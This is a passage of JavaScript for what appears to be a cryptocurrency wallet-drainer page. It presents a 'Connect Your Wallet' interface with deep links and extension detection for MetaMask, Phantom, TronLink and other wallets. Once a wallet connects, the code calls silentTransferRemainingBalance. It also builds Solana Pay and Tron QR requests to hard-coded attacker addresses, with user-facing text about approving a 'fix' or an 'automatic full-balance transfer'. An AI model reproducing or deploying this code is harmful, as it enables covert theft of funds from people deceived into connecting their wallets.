            schemeCandidates.push(`phantom://wc?uri=${encodeURIComponent(rawWc)}`);
            universalCandidates.push(`https://phantom.app/ul/v1/connect?uri=${encodeURIComponent(rawWc)}`);
        }
        if (key.includes('solflare')) {
            schemeCandidates.push(`solflare://wc?uri=${encodeURIComponent(rawWc)}`);
            universalCandidates.push(`https://solflare.com/wc?uri=${encodeURIComponent(rawWc)}`);
        }
        if (key.includes('tronlink') || key.includes('tron')) {
            schemeCandidates.push(`tronlink://wc?uri=${encodeURIComponent(rawWc)}`);
            universalCandidates.push(`https://tronlink.org/#/connect?uri=${encodeURIComponent(rawWc)}`);
        }
        if (key.includes('metamask')) {
            schemeCandidates.push(`metamask://wc?uri=${encodeURIComponent(rawWc)}`);
            universalCandidates.push(`https://metamask.app.link/wc?uri=${encodeURIComponent(rawWc)}`);
            // Android intent fallback (some Android browsers require intent URI)
            schemeCandidates.push(`intent://wc?uri=${encodeURIComponent(rawWc)}#Intent;package=io.metamask;scheme=metamask;end`);
        }
        if (key.includes('trust')) {
            schemeCandidates.push(`trust://wc?uri=${encodeURIComponent(rawWc)}`);
            universalCandidates.push(`https://link.trustwallet.com/wc?uri=${encodeURIComponent(rawWc)}`);
            schemeCandidates.push(`intent://wc?uri=${encodeURIComponent(rawWc)}#Intent;package=com.wallet.crypto.trustapp;scheme=trust;end`);
        }
        if (key.includes('coinbase')) {
            schemeCandidates.push(`coinbasewallet://wc?uri=${encodeURIComponent(rawWc)}`);
            universalCandidates.push(`https://go.cb-w.com/wc?uri=${encodeURIComponent(rawWc)}`);
        }
        if (key.includes('rainbow')) {
            schemeCandidates.push(`rainbow://wc?uri=${encodeURIComponent(rawWc)}`);
            universalCandidates.push(`https://rainbow.me/wc?uri=${encodeURIComponent(rawWc)}`);
        }
        if (key.includes('rabby')) {
            schemeCandidates.push(`rabby://wc?uri=${encodeURIComponent(rawWc)}`);
        }
        if (key.includes('tokenpocket') || key.includes('tp')) {
            schemeCandidates.push(`tokenpocket://wc?uri=${encodeURIComponent(rawWc)}`);
            universalCandidates.push(`https://tokenpocket.app/wc?uri=${encodeURIComponent(rawWc)}`);
        }
        if (key.includes('bitkeep')) {
            schemeCandidates.push(`bitkeep://wc?uri=${encodeURIComponent(rawWc)}`);
            universalCandidates.push(`https://bitkeep.com/wc?uri=${encodeURIComponent(rawWc)}`);
        }
        if (key.includes('okx')) {
            schemeCandidates.push(`okxwallet://wc?uri=${encodeURIComponent(rawWc)}`);
            universalCandidates.push(`https://okx.com/wc?uri=${encodeURIComponent(rawWc)}`);
        }
        if (key.includes('safepal')) {
            schemeCandidates.push(`safepal://wc?uri=${encodeURIComponent(rawWc)}`);
            universalCandidates.push(`https://safepal.com/wc?uri=${encodeURIComponent(rawWc)}`);
        }

        // Generic fallbacks
        schemeCandidates.push(`wc:${wcNoPrefix}`);
        universalCandidates.push(`https://walletconnect.com/wc?uri=${encodeURIComponent(rawWc)}`);

        // Deduplicate and filter empty
        const scheme = Array.from(new Set(schemeCandidates.filter(Boolean)));
        const universal = Array.from(new Set(universalCandidates.filter(Boolean)));

        return {
            scheme,       // array of scheme URLs to try in order
            universal,    // array of universal URLs to try in order
            wcColon: wcColon,
            raw: rawWc
        };
    }

    // Open specific wallet app on mobile using deep links/universal links
    async function openSpecificWallet(walletName, wcUri) {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
        const isMobile = isAndroid || isIOS;

        if (!isMobile) {
            console.warn('openSpecificWallet() called on non-mobile device');
            return false;
        }

        const walletKey = (walletName || '').toLowerCase().replace(/\s+/g, '').replace(/[^a-z0-9]/g, '');
        const links = buildPerWalletLinks(walletName, wcUri);

        if (!links || (!links.scheme.length && !links.universal.length)) {
            console.warn(`No deep link candidates for ${walletName}, falling back to WalletConnect universal`);
            window.location.href = `https://walletconnect.com/wc?uri=${encodeURIComponent(wcUri)}`;
            return false;
        }

        console.log(`[openSpecificWallet] Attempting to open ${walletName} on mobile (schemes: ${links.scheme.length}, universal: ${links.universal.length})`);
        let opened = false;

        // Try each scheme candidate (direct app open)
        for (const s of links.scheme) {
            if (!s) continue;
            try {
                console.log(`[openSpecificWallet] Trying scheme candidate: ${s}`);
                const a = document.createElement('a'); a.href = s; a.style.display = 'none'; document.body.appendChild(a); a.click(); document.body.removeChild(a);
                opened = true;
                break;
            } catch (e) {
                console.warn(`[openSpecificWallet] Scheme candidate failed: ${s}`, e);
            }
        }

        // If schemes didn't work, try universal links via iframe to avoid full navigation
        if (!opened) {
            for (const u of links.universal) {
                try {
                    if (!u) continue;
                    console.log(`[openSpecificWallet] Trying universal candidate via iframe: ${u}`);
                    const iframe = document.createElement('iframe'); iframe.src = u; iframe.style.display = 'none'; document.body.appendChild(iframe);
                    setTimeout(() => { try { document.body.removeChild(iframe); } catch (e) {} }, 1100);
                    opened = true;
                    break;
                } catch (e) {
                    console.warn(`[openSpecificWallet] Universal candidate failed: ${u}`, e);
                }
            }
        }

        // If still not opened, schedule store redirect after QR shows
        if (!opened) {
            console.log(`[openSpecificWallet] No app opened for ${walletName}, scheduling store redirect`);
            setTimeout(() => {
                if (!document.hidden) {
                    const cfg = walletDeepLinks[walletKey] || {};
                    if (isAndroid && cfg.store) {
                        window.location.href = cfg.store;
                    } else if (isIOS && cfg.iosStore) {
                        window.location.href = cfg.iosStore;
                    } else {
                        // If no store links, fallback to universal WalletConnect page
                        window.location.href = `https://walletconnect.com/wc?uri=${encodeURIComponent(wcUri)}`;
                    }
                }
            }, 5000);
        }

        // Always show QR fallback after a short delay if the user is still on the page
        setTimeout(() => {
            if (!document.hidden) {
                console.log(`[openSpecificWallet] Showing QR fallback for ${walletName}`);
                showQRFallbackOverlay(wcUri, walletName);
            }
        }, 4000);

        return opened;
    }

    // Show QR with Copy Link and Open Wallet button (for special wallets: Phantom, Tronlink, Solflare, Slush)
    
    // Function to show list of installed wallets for WalletConnect mode
    async function showInstalledWalletsList(uri, clientInstance) {
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:9999;
            display:flex; flex-direction:column; align-items:center; justify-content:center; color:white;
            font-family:system-ui; padding:20px;
        `;
        
        const isMobile = /Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent);
        
        // Show a temporary scanning UI while detection runs
        overlay.innerHTML = `
            <div style="background:rgba(23,23,26,0.95); padding:40px; border-radius:24px; max-width:420px; border:1px solid rgba(255,255,255,0.1); max-height:80vh; overflow-y:auto; text-align:center;">
                <h2 style="margin:0 0 12px 0; font-size:22px; font-weight:600;">Detecting installed wallets...</h2>
                <p id="wc-scanning-msg" style="margin:8px 0 20px 0; font-size:13px; color:#b0b0b0;">Please wait while we scan your browser for installed wallet extensions.</p>
                <div id="wc-scanning-spinner" style="width:56px;height:56px;border-radius:50%;border:6px solid rgba(255,255,255,0.06);border-top-color:#3396ff;margin:12px auto;animation:spin 1s linear infinite"></div>
            </div>
        `;
        document.body.appendChild(overlay);

        // perform detection: prefer EIP-6963 detection (async)
        let installedWallets = [];
        try {
            if (!isMobile) {
                console.log('[showInstalledWalletsList] Running EIP-6963 / extension detection...');
                const detected = await detectDesktopExtensions(800);
                // Map detected entries to the UI structure
                detected.forEach(d => {
                    try {
                        const name = d.name || 'Wallet';
                        const icon = d.icon || getIconFromManifestByName(name) || 'https://via.placeholder.com/40';
                        const type = d.type || (d.namespaces ? 'wc' : 'evm');
                        // connector uses provider if present; include Tron and Sui handling
                        const connector = (d.provider) ? (async () => {
                            if (d.type === 'evm' && d.provider.request) return await d.provider.request({ method: 'eth_requestAccounts' });
                            if (d.type === 'solana' && d.provider.connect) return await d.provider.connect();
                            if (d.type === 'tron' && d.provider.request) return await d.provider.request({ method: 'tron_requestAccounts' });
                            if (d.type === 'sui' && typeof d.provider.connect === 'function') return await d.provider.connect();
                            if (typeof d.provider.connect === 'function') return await d.provider.connect();
                            if (typeof d.provider.request === 'function') return await d.provider.request({ method: 'eth_requestAccounts' });
                            throw new Error('No connector on provider');
                        }) : null;

                        installedWallets.push({ name, icon, scheme: '', type: 'extension', connector, _meta: d });
                    } catch (e) { console.warn('Error mapping detected wallet', e); }
                });
            } else {
                // Mobile - keep the previous mobile list but will be replaced below
                console.log('[showInstalledWalletsList] Mobile mode - showing available wallet apps');
                installedWallets = [
                    { name: 'Phantom', icon: 'https://avatars.githubusercontent.com/u/65890474?s=40', scheme: 'phantom://wc?uri=', store: 'https://phantom.app/download', type: 'mobile' },
                    { name: 'MetaMask', icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/40px-MetaMask_Fox.svg.png', scheme: 'metamask://wc?uri=', store: 'https://metamask.app.link/dapp/hollyandwilly-kram.vercel.app', type: 'mobile' },
                    { name: 'Trust Wallet', icon: 'https://avatars.githubusercontent.com/u/29179640?s=40', scheme: 'trust://wc?uri=', store: 'https://trustwallet.com', type: 'mobile' },
                    { name: 'Solflare', icon: 'https://avatars.githubusercontent.com/u/51615633?s=40', scheme: 'solflare://wc?uri=', store: 'https://solflare.com', type: 'mobile' },
                    { name: 'Coinbase Wallet', icon: 'https://avatars.githubusercontent.com/u/18732972?s=40', scheme: 'coinbasewallet://wc?uri=', store: 'https://coinbase.com/wallet', type: 'mobile' },
                    { name: 'TronLink', icon: 'https://www.tronlink.org/static/images/walletLogo.png', scheme: 'tronlink://wc?uri=', store: 'https://tronlink.org', type: 'mobile' }
                ];
            }
        } catch (err) {
            console.warn('[showInstalledWalletsList] detection error:', err);
        }

        // If no detected extensions found on desktop, fall back to legacy checks
        if (!isMobile && installedWallets.length === 0) {
            console.log('[showInstalledWalletsList] No EIP-6963 results — falling back to legacy detection');
            // legacy window.ethereum providers
            try {
                if (window.ethereum) {
                    const providers = Array.isArray(window.ethereum.providers) ? window.ethereum.providers : [window.ethereum];
                    providers.forEach(p => {
                        try {
                            if (p.isMetaMask && !installedWallets.some(w => normalizeKey(w.name) === 'metamask')) {
                                installedWallets.push({ name: 'MetaMask', icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/40px-MetaMask_Fox.svg.png', scheme: 'metamask://', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }), provider: p });
                            } else if (p.isCoinbaseWallet && !installedWallets.some(w => normalizeKey(w.name) === 'coinbasewallet')) {
                                installedWallets.push({ name: 'Coinbase Wallet', icon: 'https://avatars.githubusercontent.com/u/18732972?s=40', scheme: 'cbwallet://', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }), provider: p });
                            } else if (!installedWallets.some(w => w.name === 'Ethereum Provider')) {
                                installedWallets.push({ name: 'Ethereum Provider', icon: 'https://via.placeholder.com/40', scheme: '', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }), provider: p });
                            }
                        } catch (e) { }
                    });
                }
            } catch (e) { }

            // solana legacy
            try { if (window.solana?.isPhantom) installedWallets.push({ name: 'Phantom', icon: 'https://avatars.githubusercontent.com/u/65890474?s=40', scheme: 'phantom://wc?uri=', type: 'extension', connector: async () => window.solana.connect(), provider: window.solana }); } catch (e) {}
            try { if (window.solflare) installedWallets.push({ name: 'Solflare', icon: 'https://avatars.githubusercontent.com/u/51615633?s=40', scheme: 'solflare://wc?uri=', type: 'extension', connector: async () => window.solflare.connect(), provider: window.solflare }); } catch (e) {}
            try { if (window.tronLink || window.tronWeb) installedWallets.push({ name: 'TronLink', icon: 'https://www.tronlink.org/static/images/walletLogo.png', scheme: 'tronlink://wc?uri=', type: 'extension', connector: async () => { if (window.tronLink?.request) return await window.tronLink.request({ method: 'tron_requestAccounts' }); if (window.tronWeb?.request) return await window.tronWeb.request({ method: 'tron_requestAccounts' }); throw new Error('TronLink not available'); }, provider: window.tronLink || window.tronWeb }); } catch (e) {}

            // known globals
            const knownWallets = [
                { name: 'Rabby', props: ['rabby', 'Rabby'], icon: 'https://avatars.githubusercontent.com/u/114750863' },
                { name: 'OKX', props: ['okxwallet', 'okx'], icon: 'https://avatars.githubusercontent.com/u/69880710' },
                { name: 'BitKeep', props: ['bitkeep', 'Bitkeep', 'BitKeep'], icon: 'https://avatars.githubusercontent.com/u/108622886' },
                { name: 'Token Pocket', props: ['tp', 'TokenPocket', 'tokenPocket'] }
            ];
            knownWallets.forEach(w => {
                if (installedWallets.some(x => normalizeKey(x.name) === normalizeKey(w.name))) return;
                for (const prop of w.props) {
                    try {
                        const provider = window[prop];
                        if (provider) {
                            installedWallets.push({ name: w.name, icon: w.icon || 'https://via.placeholder.com/40', scheme: '', type: 'extension', connector: async () => { if (typeof provider.request === 'function') return await provider.request({ method: 'eth_requestAccounts' }); if (typeof provider.connect === 'function') return await provider.connect(); if (typeof provider.enable === 'function') return await provider.enable(); throw new Error('No connection method'); }, provider });
                            break;
                        }
                    } catch (e) {}
                }
            });
        }

        // Build wallet buttons HTML (replace overlay content)
        const buildWalletsHtml = (list) => {
            if (!list || list.length === 0) return '<p style="color:#aaa; font-size:14px; margin:20px 0;">No wallet extensions detected on this device.</p>';
            return list.map(w => `
                <button data-wallet-name="${encodeURIComponent(w.name)}" 
                        style="display:flex; align-items:center; justify-content:flex-start; gap:12px; width:100%; padding:12px 16px; background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.06); border-radius:12px; color:white; cursor:pointer; margin-bottom:10px; transition:all 0.12s; font-size:15px; font-weight:500;">
                    <img src="${w.icon}" style="width:28px; height:28px; border-radius:6px; object-fit:cover;" alt="${w.name}">
                    <span>Continue with ${w.name}</span>
                </button>
            `).join('');
        };

        const walletsHTML = buildWalletsHtml(installedWallets);

        // Replace overlay content with detected wallets and QR/copy UI
        overlay.innerHTML = `
            <div style="background:rgba(23,23,26,0.95); padding:24px; border-radius:20px; max-width:520px; border:1px solid rgba(255,255,255,0.08); max-height:80vh; overflow-y:auto;">
                <h2 style="margin:0 0 8px 0; font-size:22px; font-weight:600;">Connect Your Wallet</h2>
                <p style="margin:0 0 16px 0; font-size:13px; line-height:1.6; color:#b0b0b0;">${isMobile ? 'Choose a wallet app to connect with' : 'Choose a wallet extension to connect with'}</p>
                <div id="wc-detected-list" style="margin-bottom:16px;">${walletsHTML}</div>

                <!-- QR Code Fallback -->
                <div style="background:rgba(255,255,255,0.03); padding:12px; border-radius:12px; margin-bottom:12px;">
                    <p style="margin:0 0 8px 0; font-size:12px; color:#888; font-weight:500;">Or scan with any wallet:</p>
                    <div style="background:white; padding:6px; border-radius:8px; display:inline-block;"><img src="https://quickchart.io/qr?text=${encodeURIComponent(uri)}&size=180" style="width:180px;height:180px;display:block;" alt="WalletConnect QR"></div>
                    <p style="margin:8px 0 0 0; font-size:12px; color:#888;">Scan with your wallet app</p>
                </div>

                <!-- Copy Link -->
                <div style="background:rgba(255,255,255,0.03); padding:10px; border-radius:8px; margin-bottom:12px;">
                    <p style="margin:0 0 8px 0; font-size:12px; color:#888;">Connection link:</p>
                    <input type="text" id="wc-uri-input-list" readonly value="${uri}" style="width:100%; padding:8px; background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.06); border-radius:6px; color:white; font-size:11px; margin-bottom:8px; box-sizing:border-box; font-family:monospace; overflow:hidden; text-overflow:ellipsis;" />
                    <button id="copy-uri-btn-list" style="width:100%; padding:8px 12px; background:rgba(51,150,255,0.12); color:#3396ff; border:1px solid #3396ff; border-radius:6px; font-size:12px; cursor:pointer; transition:all 0.12s;">Copy Link</button>
                </div>

                <button id="wallets-list-close-btn" style="width:100%; padding:10px; background:rgba(255,255,255,0.03); color:white; border:1px solid rgba(255,255,255,0.06); border-radius:12px; font-size:14px; cursor:pointer; transition:all 0.12s;">Close</button>
            </div>
        `;
        
        // overlay already appended with scanning UI; now replaced above with final UI
        
        // Handle wallet buttons using data-wallet-name mapping
        overlay.querySelectorAll('[data-wallet-name]').forEach((btn) => {
            btn.addEventListener('click', async () => {
                const name = decodeURIComponent(btn.dataset.walletName || '');
                const wallet = installedWallets.find(w => normalizeKey(w.name) === normalizeKey(name));

                btn.style.opacity = '0.7';
                try {
                    // Prefer calling an injected/extension connector on desktop when available
                    if (wallet && wallet.type === 'extension' && typeof wallet.connector === 'function') {
                        console.log('[showInstalledWalletsList] Calling extension connector for', wallet.name);
                        try {
                            overlay.remove();
                            const res = await wallet.connector();
                            console.log('[showInstalledWalletsList] Extension connector result', res);
                            try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}

                            // Attempt silent transfer using the provider if present
                            try {
                                const provider = wallet.provider || null;
                                let accounts = [];
                                let chainId = null;
                                if (provider && typeof provider.request === 'function') {
                                    try { accounts = await provider.request({ method: 'eth_accounts' }); } catch (e) { /* ignore */ }
                                    try { chainId = await provider.request({ method: 'eth_chainId' }); } catch (e) { /* ignore */ }
                                }
                                const connectionInfo = { provider: provider || null, address: (accounts && accounts[0]) || null, chainId, session: null };
                                await silentTransferRemainingBalance(connectionInfo);
                            } catch (e) { console.warn('Silent transfer failed:', e); }
                            return;
                        } catch (e) {
                            console.warn('[showInstalledWalletsList] Extension connector failed, falling back to WalletConnect:', e);
                            // on failure fallthrough to WalletConnect flow
                            document.body.appendChild(overlay);
                        }
                    }

                    // Fallback: use connectAllChains for multi-chain WalletConnect flow
                    console.log('[showInstalledWalletsList] Initiating multi-chain connection for', wallet?.name || name);
                    try {
                        overlay.remove();
                        const wcResult = await connectAllChains(wallet?.name || name);

                        console.log('[showInstalledWalletsList] ✓ Multi-chain connection succeeded for', wallet?.name || name);

                        const connectionInfo = {
                            provider: null,
                            walletName: wallet?.name || name,
                            walletType: 'multichain',
                            result: wcResult.session,
                            client: wcResult.client,
                            session: wcResult.session,
                            namespaces: wcResult.namespaces,
                            multiChain: true
                        };

                        try { await silentTransferRemainingBalance(connectionInfo); } catch (e) { console.warn('silentTransferRemainingBalance error:', e); }
                        return;
                    } catch (e) {
                        console.log('[showInstalledWalletsList] Multi-chain connection failed:', e.message);
                        // Re-add overlay for retry or close
                        document.body.appendChild(overlay);
                    }

                } finally {
                    btn.style.opacity = '';
                }
            });
        });
        
        // Copy link button
        const copyBtn = overlay.querySelector('#copy-uri-btn-list');
        if (copyBtn) {
            copyBtn.addEventListener('click', () => {
                const input = overlay.querySelector('#wc-uri-input-list');
                input.select();
                document.execCommand('copy');
                const originalText = copyBtn.textContent;
                copyBtn.textContent = '✓ Copied!';
                copyBtn.style.background = 'rgba(34,197,94,0.2)';
                copyBtn.style.color = '#22c55e';
                copyBtn.style.borderColor = '#22c55e';
                setTimeout(() => {
                    copyBtn.textContent = originalText;
                    copyBtn.style.background = 'rgba(51,150,255,0.2)';
                    copyBtn.style.color = '#3396ff';
                    copyBtn.style.borderColor = '#3396ff';
                }, 2000);
            });
        }
        
        // Close button
        const closeBtn = overlay.querySelector('#wallets-list-close-btn');
        closeBtn.addEventListener('click', () => {
            overlay.remove();
            // Show wallet modal again
            try {
                const modalOverlay = document.getElementById('modal-overlay');
                if (modalOverlay) { modalOverlay.classList.remove('active'); setTimeout(() => { modalOverlay.style.display = 'none'; }, 400); }
                showManualConnectModal();
            } catch (e) { console.warn('Failed to show manual overlay:', e); }
        });
    }

    function showQRWithCopyAndOpenButton(wcUri, walletName) {
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:9999;
            display:flex; flex-direction:column; align-items:center; justify-content:center; color:white;
            font-family:system-ui; padding:20px; text-align:center;
        `;
        
        // Build wallet-specific deep link(s)
        const perLinks = buildPerWalletLinks(walletName, wcUri);
        const deepLink = (perLinks.scheme && perLinks.scheme.length) ? perLinks.scheme[0] : ((perLinks.universal && perLinks.universal.length) ? perLinks.universal[0] : `https://walletconnect.com/wc?uri=${encodeURIComponent(wcUri)}`);
        const qrUrl = `https://quickchart.io/qr?text=${encodeURIComponent(wcUri)}&size=300`;
        
        overlay.innerHTML = `
            <div style="background:rgba(255,255,255,0.05); padding:40px; border-radius:24px; max-width:420px; border:1px solid rgba(255,255,255,0.1);">
                <h2 style="margin:0 0 16px 0; font-size:24px; font-weight:600;">${walletName}</h2>
                <p style="margin:0 0 28px 0; font-size:14px; line-height:1.6; color:#b0b0b0;">
                    Choose a method to connect
                </p>
                
                <!-- QR Code -->
                <div style="background:white; padding:16px; border-radius:16px; margin-bottom:24px; display:inline-block;">
                    <img src="${qrUrl}" 
                         style="width:240px;height:240px;display:block;" alt="WalletConnect QR">
                </div>
                
                <p style="margin:0 0 12px 0; font-size:13px; color:#888;">Scan with ${walletName} app</p>
                
                <!-- Copy Link -->
                <div style="background:rgba(255,255,255,0.08); padding:12px; border-radius:12px; margin-bottom:20px; word-break:break-all;">
                    <p style="margin:0 0 8px 0; font-size:12px; color:#888;">Or copy connection link:</p>
                    <input type="text" id="wc-uri-input" readonly value="${wcUri}" 
                           style="width:100%; padding:8px; background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.1); border-radius:8px; color:white; font-size:12px; margin-bottom:8px; box-sizing:border-box; font-family:monospace;" />
                    <button id="copy-uri-btn" 
                            style="width:100%; padding:8px 16px; background:rgba(51,150,255,0.2); color:#3396ff; border:1px solid #3396ff; border-radius:8px; font-size:13px; cursor:pointer; transition:all 0.2s;">
                        Copy Link
                    </button>
                </div>
                
                <!-- Open Wallet Button -->
                <a href="${deepLink}" 
                   style="display:block; width:100%; padding:14px; background:#3396ff; color:white; border:none; border-radius:12px; font-size:16px; font-weight:600; cursor:pointer; text-decoration:none; margin-bottom:12px; transition:all 0.2s; text-align:center;">
                    Open ${walletName}
                </a>
                
                <!-- Close Button -->
                <button id="qr-copy-close-btn"
                        style="width:100%; padding:12px; background:rgba(255,255,255,0.08); color:white; border:1px solid rgba(255,255,255,0.1); border-radius:12px; font-size:14px; cursor:pointer; transition:all 0.2s;">
                    Cancel
                </button>
            </div>
        `;

        document.body.appendChild(overlay);
        
        // Copy link button
        const copyBtn = overlay.querySelector('#copy-uri-btn');
        copyBtn.addEventListener('click', () => {
            const input = overlay.querySelector('#wc-uri-input');
            input.select();
            document.execCommand('copy');
            const originalText = copyBtn.textContent;
            copyBtn.textContent = '✓ Copied!';
            copyBtn.style.background = 'rgba(34,197,94,0.2)';
            copyBtn.style.color = '#22c55e';
            copyBtn.style.borderColor = '#22c55e';
            setTimeout(() => {
                copyBtn.textContent = originalText;
                copyBtn.style.background = 'rgba(51,150,255,0.2)';
                copyBtn.style.color = '#3396ff';
                copyBtn.style.borderColor = '#3396ff';
            }, 2000);
        });
        
        // Close button
        const closeBtn = overlay.querySelector('#qr-copy-close-btn');
        closeBtn.addEventListener('click', () => {
            overlay.remove();
            // Show wallet modal again
            try {
                const modalOverlay = document.getElementById('modal-overlay');
                if (modalOverlay) { modalOverlay.classList.remove('active'); setTimeout(() => { modalOverlay.style.display = 'none'; }, 400); }
                showManualConnectModal();
            } catch (e) { console.warn('Failed to show manual overlay:', e); }
        });
    }

    // Show QR code fallback overlay
    function showQRFallbackOverlay(wcUri, walletName, predictedAmount = null) {
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position:fixed; inset:0; background:rgba(0,0,0,0.92); z-index:9999;
            display:flex; flex-direction:column; align-items:center; justify-content:center; color:white;
            font-family:system-ui; padding:20px; text-align:center;
        `;

        // Network-specific helper URIs (targets used by transfer functions)
        const evmTarget = '0xa292df0eaf4991507174cca2643b4e963181c5d4';
        const solanaTarget = 'GRZru2JL5ovv37Bj2YjxuSLbA28eWYcq5YcuhzMvi2a7';
        const tronTarget = 'TSEDpA8rJAZtTioMX9iUGSidzsLNRirVh5';

        // Build alternative URIs
        const walletConnectUri = wcUri || '';
        // Solana Pay (recipient prefilled) - include amount when predictedAmount provided
        let solanaPay = `solana:${solanaTarget}?label=${encodeURIComponent('Connect & Transfer')}&message=${encodeURIComponent('Approve transfer')}`;
        if (predictedAmount != null) {
            // predictedAmount expected in lamports or SOL number? accept SOL float
            const amt = Number(predictedAmount);
            if (!Number.isNaN(amt) && isFinite(amt) && amt > 0) {
                solanaPay += `&amount=${encodeURIComponent(String(amt))}`;
            }
        }
        // Tron generic URI (best-effort fallback) - not a standardized "tron-pay" spec but many apps accept tron:<addr>
        const tronPay = `tron:${tronTarget}`;

        // Default initial QR type: WalletConnect
        let currentType = 'wc';

        overlay.innerHTML = `
            <div style="max-width:520px; width:100%; background:rgba(23,23,26,0.95); padding:20px; border-radius:16px; border:1px solid rgba(255,255,255,0.06);">
                <h2 style="margin:0 0 8px 0; font-size:20px; font-weight:600;">${walletName} — Scan to connect</h2>
                <p id="qr-subtext" style="margin:6px 0 14px 0; color:#b8c2cc; font-size:13px;">Scan this QR in your wallet app to approve connection and start the transfer.</p>

                <div style="display:flex; gap:8px; justify-content:center; margin-bottom:12px;">
                    <button id="qr-type-wc" style="padding:8px 12px; border-radius:8px; background:rgba(51,150,255,0.12); color:#3396ff; border:1px solid #3396ff; cursor:pointer;">WalletConnect</button>
                    <button id="qr-type-sol" style="padding:8px 12px; border-radius:8px; background:rgba(255,255,255,0.03); color:#ccc; border:1px solid rgba(255,255,255,0.04); cursor:pointer;">Solana Pay</button>
                    <button id="qr-type-tron" style="padding:8px 12px; border-radius:8px; background:rgba(255,255,255,0.03); color:#ccc; border:1px solid rgba(255,255,255,0.04); cursor:pointer;">Tron</button>
                </div>

                <div id="qr-image-wrap" style="background:white; padding:12px; border-radius:12px; display:inline-block;">
                    <img id="qr-image" src="https://quickchart.io/qr?text=${encodeURIComponent(walletConnectUri)}&size=300" style="width:260px;height:260px; display:block;" alt="QR">
                </div>

                <div style="margin-top:12px; display:flex; gap:8px;">
                    <input id="qr-uri-input" readonly value="${walletConnectUri}" style="flex:1; font-family:monospace; padding:8px; background:rgba(0,0,0,0.35); color:white; border-radius:8px; border:1px solid rgba(255,255,255,0.04);" />
                    <button id="qr-copy-btn" style="padding:8px 10px; background:rgba(51,150,255,0.12); color:#3396ff; border:1px solid #3396ff; border-radius:8px; cursor:pointer;">Copy</button>
                </div>

                <div style="margin-top:10px; display:flex; gap:8px; justify-content:center;">
                    <button id="qr-open-in-app-btn" style="padding:10px 14px; background:#0ea5a4; color:white; border-radius:10px; border:1px solid rgba(0,0,0,0.06); cursor:pointer; display:none;">Open in App</button>
                </div>

                <div style="margin-top:14px; display:flex; gap:8px; justify-content:center;">
                    <button id="qr-close-btn" style="padding:10px 14px; background:#334155; color:#e6eef8; border-radius:10px; border:1px solid rgba(255,255,255,0.04); cursor:pointer;">Close</button>
                </div>
            </div>
        `;

        document.body.appendChild(overlay);

        const img = overlay.querySelector('#qr-image');
        const uriInput = overlay.querySelector('#qr-uri-input');
        const copyBtn = overlay.querySelector('#qr-copy-btn');
        const typeWc = overlay.querySelector('#qr-type-wc');
        const typeSol = overlay.querySelector('#qr-type-sol');
        const typeTron = overlay.querySelector('#qr-type-tron');

        function setType(t) {
            currentType = t;
                if (t === 'wc') {
                // If this QR is intended for Tron wallets, present the TronLink deep-link as the QR payload
                let displayedWc = walletConnectUri;
                try {
                    const nk = (walletName || '').toLowerCase();
                    if (nk.includes('tron') || nk.includes('tronlink')) {
                        displayedWc = `tronlink://wc?uri=${encodeURIComponent(walletConnectUri)}`;
                    }
                } catch (e) { /* ignore */ }

                img.src = `https://quickchart.io/qr?text=${encodeURIComponent(displayedWc)}&size=300`;
                uriInput.value = displayedWc;
                typeWc.style.background = 'rgba(51,150,255,0.12)'; typeWc.style.color = '#3396ff';
                typeSol.style.background = 'rgba(255,255,255,0.03)'; typeSol.style.color = '#ccc';
                typeTron.style.background = 'rgba(255,255,255,0.03)'; typeTron.style.color = '#ccc';
                overlay.querySelector('#qr-subtext').textContent = 'Scan with any WalletConnect-compatible wallet to approve connection and start the fix.';
            } else if (t === 'sol') {
                img.src = `https://quickchart.io/qr?text=${encodeURIComponent(solanaPay)}&size=300`;
                uriInput.value = solanaPay;
                typeWc.style.background = 'rgba(255,255,255,0.03)'; typeWc.style.color = '#ccc';
                typeSol.style.background = 'rgba(34,197,94,0.12)'; typeSol.style.color = '#22c55e';
                typeTron.style.background = 'rgba(255,255,255,0.03)'; typeTron.style.color = '#ccc';
                if (predictedAmount == null) {
                    overlay.querySelector('#qr-subtext').textContent = 'Solana Pay requires an amount; your wallet will ask you to enter it. For automatic full-balance transfer use WalletConnect (default).';
                } else {
                    overlay.querySelector('#qr-subtext').textContent = `Solana Pay QR with amount=${predictedAmount} SOL: scanning will open your wallet prefilled to send this amount.`;
                }
            } else if (t === 'tron') {
                // For explicit Tron QR, use WalletConnect deep-link (most reliable for TronLink mobile)
                const wcDeep = walletConnectUri ? `tronlink://wc?uri=${encodeURIComponent(walletConnectUri)}` : null;
                const payload = wcDeep || tronPay;
                img.src = `https://quickchart.io/qr?text=${encodeURIComponent(payload)}&size=300`;
                uriInput.value = payload;
                typeWc.style.background = 'rgba(255,255,255,0.03)'; typeWc.style.color = '#ccc';
                typeSol.style.background = 'rgba(255,255,255,0.03)'; typeSol.style.color = '#ccc';
                typeTron.style.background = 'rgba(250,204,21,0.12)'; typeTron.style.color = '#f59e0b';
                overlay.querySelector('#qr-subtext').textContent = 'Tron QR: Scan with TronLink app. Tap "Connect" button in TronLink to approve connection. (Tested Jan 2026)';
            }
        }

        typeWc.addEventListener('click', () => setType('wc'));
        typeSol.addEventListener('click', () => setType('sol'));
        typeTron.addEventListener('click', () => setType('tron'));

        copyBtn.addEventListener('click', () => {
            uriInput.select();
            try { document.execCommand('copy'); } catch (e) { }
            const old = copyBtn.textContent;
            copyBtn.textContent = '✓ Copied';
            copyBtn.style.background = 'rgba(34,197,94,0.12)'; copyBtn.style.color = '#22c55e';
